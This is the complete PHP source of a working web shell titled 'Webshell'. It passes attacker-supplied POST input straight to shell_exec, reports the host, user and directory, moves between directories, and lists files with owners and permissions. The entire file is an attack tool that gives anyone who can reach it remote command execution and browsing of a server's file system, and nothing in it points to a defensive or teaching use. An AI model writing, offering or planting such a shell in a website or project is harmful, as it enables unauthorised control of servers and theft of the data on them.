<?php
    $NAME = "Webshell";

    if(isset($_POST["chdir"])){
        chdir($_POST["chdir"]);
    }

    $CURRENT_DEVICE = shell_exec("uname -a");
    $CURRENT_USER = shell_exec("whoami");
    $CURRENT_DIR = trim(shell_exec("pwd"));
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title><?php echo $NAME; ?></title>
    </head>
    <body>
        <h1><?php echo $NAME; ?></h1>
        <div>
            Device: <?php echo $CURRENT_DEVICE; ?><br>
            Current user: <?php echo $CURRENT_USER; ?><br>
            Current directory:
            <?php
                $path_parts = explode('/', trim($CURRENT_DIR));
                $total_path = "";
                foreach ($path_parts as $dir) {
                    $dir = $dir.'/';
                    $total_path = $total_path.$dir;
                    echo "<form method=\"post\" action=\"".htmlspecialchars($_SERVER["PHP_SELF"])."\" class=\"nav-btn\">
                    <input type=\"hidden\" name=\"chdir\" value=\"".$total_path."\">
                    <input type=\"submit\" value=\"".$dir."\"></input></form>";
                }
            ?><br>
        </div>

        <?php
            if(isset($_POST["sh"])){
                $CMD = shell_exec("cd \"".$CURRENT_DIR."\" && ".$_POST["sh"]." 2>&1");
            }
        ?>

        <form method="post" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>">
            <input type="text" name="sh" autocomplete="off" autofocus>
            <input type="hidden" name="chdir" value="<?php echo $CURRENT_DIR; ?>">
            <input type="submit" value="Run">
        </iframe>

        <pre><?php echo $CMD; ?></pre>

        <?php
            function getDirContents($dir) {
                $result = [];
            
                if (!is_dir($dir)) {
                    die("The provided path is not a directory");
                }
            
                $items = scandir($dir);
                foreach ($items as $item) {
                    if ($item) { // != "." && $item != "..") {
                        $path = $dir . DIRECTORY_SEPARATOR . $item;
                        $stat = stat($path);
                        $result[$item] = [
                            'permissions' => formatPermissions(fileperms($path)),
                            'owner' => posix_getpwuid($stat['uid'])['name'],
                            'filesize' => $stat['size'],
                            'last_changed' => date("F d Y H:i:s", $stat['mtime']),
                        ];
            
                        if (is_dir($path)) {
                            $result[$item]['type'] = 'directory';
                            // $result[$item]['contents'] = getDirContents($path); // Recursively get subdirectory contents
                        } else {
                            $result[$item]['type'] = 'file';
                        }
                    }
                }
            
                return $result;
            }
            
            function formatPermissions($perms) {
                $info = '';
            
                // File type
                if (($perms & 0xC000) == 0xC000) {
                    $info = 's'; // Socket
                } elseif (($perms & 0xA000) == 0xA000) {
                    $info = 'l'; // Symbolic Link
                } elseif (($perms & 0x8000) == 0x8000) {
                    $info = '-'; // Regular
                } elseif (($perms & 0x6000) == 0x6000) {
                    $info = 'b'; // Block special
                } elseif (($perms & 0x4000) == 0x4000) {
                    $info = 'd'; // Directory
                } elseif (($perms & 0x2000) == 0x2000) {
                    $info = 'c'; // Character special
                } elseif (($perms & 0x1000) == 0x1000) {
                    $info = 'p'; // FIFO pipe
                } else {
                    $info = 'u'; // Unknown
                }
            
                // Owner
                $info .= (($perms & 0x0100) ? 'r' : '-');
                $info .= (($perms & 0x0080) ? 'w' : '-');
                $info .= (($perms & 0x0040) ?
                           (($perms & 0x0800) ? 's' : 'x' ) :
                           (($perms & 0x0800) ? 'S' : '-'));
            
                // Group
                $info .= (($perms & 0x0020) ? 'r' : '-');
                $info .= (($perms & 0x0010) ? 'w' : '-');
                $info .= (($perms & 0x0008) ?
                           (($perms & 0x0400) ? 's' : 'x' ) :
                           (($perms & 0x0400) ? 'S' : '-'));
            
                // World
                $info .= (($perms & 0x0004) ? 'r' : '-');
                $info .= (($perms & 0x0002) ? 'w' : '-');
                $info .= (($perms & 0x0001) ?
                           (($perms & 0x0200) ? 't' : 'x' ) :
                           (($perms & 0x0200) ? 'T' : '-'));
            
                return $info;
            }
        ?>

        <h3>Directory listing</h3>
        <table>
            <tr>
                <th>Filename</th>
                <th>Type</th>
                <th>Filesize</th>
                <th>Owner</th>
                <th>Permissions</th>
                <th>Last changed</th>
            </tr>
            <?php
                $contents = getDirContents($CURRENT_DIR);
                // print_r($contents);
                foreach ($contents as $dir => $values) {
                    echo "<tr>";
                    echo "<th>".$dir."</th>";
                    echo "<th>".$values["type"]."</th>";
                    echo "<th>".$values["filesize"]."</th>";
                    echo "<th>".$values["owner"]."</th>";
                    echo "<th>".$values["permissions"]."</th>";
                    echo "<th>".$values["last_changed"]."</th>";
                    echo "</tr>";
                }
            ?>
        </table>

        <style>
            body{
                font-family: Helvetica;
            }
            .nav-btn{
                display: inline;
            }
            .nav-btn input{
                background: none;
                border: none;
                outline: none;
                text-decoration: underline;
                color: blue;
                cursor: pointer;
                margin: 0;
                padding: 0;
            }
            table th{
                text-align: left;
                font-weight: normal !important;
                font-family: Consolas, Menlo, Monaco, Lucida Console, Liberation Mono, DejaVu Sans Mono, Bitstream Vera Sans Mono, Courier New, monospace, serif;
                padding-right: 25px;
            }
        </style>
    </body>
</html>